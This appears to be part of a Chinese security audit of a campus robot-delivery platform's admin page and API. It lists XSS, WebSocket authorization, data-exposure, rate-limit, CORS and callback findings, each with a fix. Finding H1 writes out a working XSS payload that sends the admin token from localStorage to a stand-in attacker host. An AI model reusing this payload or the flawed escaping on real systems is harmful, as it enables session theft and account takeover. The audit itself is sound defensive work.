## 四、高危发现

### H1. 管理员网页存储型 XSS：商品图片 URL 属性注入 → 管理员会话窃取

**风险等级：高（管理员 token 泄露 = 机器人控制 + 全量数据）**

利用链：

1. `管理员网页/js/parts/admin/01-core.js` 的转义函数只替换 `<` 与 `>`，**不转义引号**：
   ```js
   function esc(s) { return String(...).replace(/</g, '&lt;').replace(/>/g, '&gt;') }
   ```
2. 商品图片被渲染进 **属性上下文**（`05-render-cards.js`、`07-drawer.js`、`orderSubCardHtml`）：
   ```js
   '<img class="o-thumb" src="' + esc(it.goods_image) + '" onerror="...">'
   ```
   由于 `"` 未转义，`goods_image` 含 `"` 时即可逃逸出 `src` 属性。
3. 后端 `PUT /api/merchant/goods`（`domains/goods/routes.js`）对 `image` 字段**无任何白名单/格式校验**，原样入库（`domains/goods/queries.js`），下单时快照进 `order_items.goods_image`。
4. 商家店主把某商品 image 设为：
   ```
   x" onerror="fetch('//evil.example/?c='+encodeURIComponent(localStorage.getItem('lingdong_admin_token')))
   ```
5. 该商品被用户下单后，管理员打开订单卡 / 详情抽屉 → `<img src="x" onerror="...">` 执行 → 管理员 token（存于 localStorage）被外传 → 攻击者调用 `/api/admin/*` 任意接口（停机器人、清理批次、重置商家密码、一键初始化）。

**修复建议（三选二以上）**：
- ① `esc()` 升级为完整转义：`& < > " '`（或统一用 `textContent` 赋值）；
- ② 服务端对 `goods.image` / `activities.image` 做白名单：只允许 `/uploads/`、`/store-img/` 前缀的相对路径或 `https://` 外链，并限制长度；
- ③ 管理页图片一律 `createElement('img')` 后 `.src = value`（属性赋值不解析 HTML）。

### H2. WebSocket 主题订阅无角色鉴权：任意登录用户可订阅 admin/live 实时数据

**风险等级：高（校园内任何学生可实时监控全部机器人位置/设备状态）**

现状：

- `services/push.js` 连接鉴权只校验「token 是否有效」（`validateToken` 检查 users 或 admin_sessions），**对 sub 消息的主题不做任何角色检查**；
- 管理员网页 `04-overview-ws.js` 连接后发送 `{type:'sub', topics:['admin/live']}`；
- `domains/admin/live.js` 每 2.5s 向订阅者推送机器人实时坐标、设备号、电量、机器状态；
- 学生/店员 token 一样能连接 `/ws` 并订阅 `admin/live`，持续收到全部机器人实时位置与状态。

**修复建议**：`push.js` 处理 `sub` 消息时校验主题权限——`admin/live` 只允许「admin_sessions 有效 token」订阅，其它主题（如 `order_created`）保持登录即可。同时服务端广播 `order_created / batch_dispatched` 目前是全站广播（任何登录用户可收），如介意可改为按商家端限定。

## 五、中危发现

### M1. `GET /api/user/profile` 返回 users 整行（含 password_hash / token / openid / 手机号）

- `domains/user/routes.js` `router.get('/user/profile', auth, (req, res) => ok(res, req.user))` 直接返回 `SELECT *` 的整行；
- 其中 **password_hash 是 scrypt 哈希、token 是会话凭据、openid 同时就是用户端会话 token**（`_shared.js` 鉴权 `WHERE token=? OR openid=?`）；
- 登录响应（`user/service.js`）同样返回整行 `user`，被小程序明文缓存进本地 storage；
- openid 即会话 token 的设计意味着：openid 一旦泄露（截图分享、日志、缓存泄露）即可冒充该用户下单/取餐。

**修复建议**：
- ① profile/登录响应改为白名单字段：`id, nickname, avatar, phone, role, landmark_id, landmark_name, merchant_role, status`；
- ② 长期：用户端也改为随机 session token（与商家端一致），openid 不再当 token 用。

### M2. 取餐码（4 位）可被枚举：pickup-by-code 无速率限制

- `POST /api/delivery/pickup-by-code` 校验订单归属 + `pickup_code` 匹配，但**无失败计数/限速**；
- 4 位数字 = 1 万种组合，已登录用户拿到某 device_sn 后可脚本枚举；
- 成功后可获取他人订单上下文（`pickupContext` 中的联系人、取餐码、点位信息），无法直接开他人舱（`pickup-open` 校验订单归属），但构成他人订单信息泄露。

**修复建议**：按「IP + device_sn」限速（如每 30 秒最多 5 次）、失败后锁定窗口；或把取餐码改为 6 位。

### M3. 大屏只读接口免登录公开运营数据

- `GET /api/dashboard/overview`、`/api/dashboard/map-image`、`/api/config/tianditu` 均无鉴权；
- 内容含：今日订单金额统计、机器人实时位置/电量/状态、点位与路网、取餐超时告警（订单号+点位）；
- 配合 `BIND_HOST` 默认 `0.0.0.0`，校园网内任何人（不登录）可看全部运营数据。

**修复建议**：上线前确认大屏是否需要公开；不需要则加 adminGuard，或至少给大屏接口加独立访问口令；服务器上 `BIND_HOST=127.0.0.1` 只让 nginx 反代访问。

### M4. CORS 全开 + 服务器 0.0.0.0 监听

- `server.js` `app.use(cors())` 允许任意 Origin 调用全部 API（接口本身需 token，但若 H1 修复前被 XSS 利用会放大影响）；
- 上线部署时若直接暴露 3000 端口，管理员页、大屏、API 全部对公网可达。

**修复建议**：`cors` 配置白名单（小程序请求无 Origin 需按实际调试）；服务器上仅经 nginx 443 暴露，后端绑定 127.0.0.1。

### M5. 平台回调接口匿名 + callbackToken 依赖 PLATFORM_SECRET

- `domains/delivery/service.js` `callbackAuthorized`：**`!expected` 时直接放行**（注释：无真实平台对接时放行）；
- `services/runtime.js`：callbackToken 显式配置或由 `PLATFORM_SECRET` 派生；**production 档启动守卫未强制校验 callbackToken 非空**；
- 若上线 production 时忘记配置 `PLATFORM_SECRET` / `PLATFORM_CALLBACK_TOKEN`，任何人都能伪造 `feedbackDeliveryTaskUrl` 回调把任务/订单驱动到任意状态（如伪造「已送达」）。

**修复建议**：production 档启动守卫增加「callbackToken 必须非空」；回调接口再叠加来源 IP/证书校验。

## 七、做得好的地方（保持不动）

1. **密码与会话**：scrypt 加盐 + `timingSafeEqual`；管理员/商家 session 32 字节随机、7 天过期、可吊销；禁用账号即吊销全部 session。
2. **SQL 注入**：全量 grep 确认所有查询参数绑定，无一处用户输入拼接进 SQL。
3. **金额权威**：`promotion.js` + `order/service.js` 服务端按商品表计算金额/优惠，客户端无法自报价；配送费下单时快照。
4. **支付回调**：证书验签 → 商户号/appid 比对 → event_id 幂等 → 金额比对 → `WHERE status=0` CAS 置已支付；退款仅对 `pay_channel='wxpay'` 且凭据就绪的真实退。
5. **商家权限**：`merchantGuard` 封死历史微信登录当商家的路径；`ownerGuard` 店主专属（改价/歇业/活动）；店员只能补货/上货。
6. **个人信息**：商家端接口手机号默认 `138****0000` 脱敏；匿名请求裁剪平台内部点位 ID。
7. **资源上限**：WS 单帧/缓冲/连接数/空闲回收上限（防 OOM）；头像 2MB、请求体 8MB；管理员登录 5 次锁 10 分钟、用户/商家登录 20 次锁 10 分钟。
8. **审计**：`auditMw` 统一落库成功/失败 + 操作者线索进状态流水；管理页破坏性操作全部二次确认。
9. **配置与密钥**：`.env`/`data/`/`uploads/` 全部 gitignore，git 历史无密钥；运行模式守卫拒绝 demo/pilot/production 非法组合。
10. **依赖**：express 4.22.2、cors 2.8.6、qs 6.15.3（均 ≥ 已知 CVE 修复版）。
